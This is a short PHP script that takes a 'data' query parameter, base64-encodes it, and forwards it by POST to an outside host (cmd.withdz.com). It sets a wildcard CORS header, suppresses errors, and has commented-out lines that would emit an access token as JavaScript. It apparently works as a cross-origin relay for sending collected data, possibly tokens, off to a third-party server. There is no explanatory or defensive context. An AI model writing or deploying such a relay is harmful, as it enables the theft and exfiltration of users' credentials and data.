<?php



header("Access-Control-Allow-Origin: *");


error_reporting(0);


$data = $_GET['data'];

$data = base64_encode($data);

echo "$data **** ";




$postdata = http_build_query(
    array(
        'data' => $data
    )
);



$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded',
        'content' => $postdata
    )
);


$context  = stream_context_create($opts);


$result = file_get_contents('http://cmd.withdz.com/ok/get.php', false, $context);

echo $result;





//header('Content-Type: application/javascript');

//echo "var tok='$access_token';";





?>
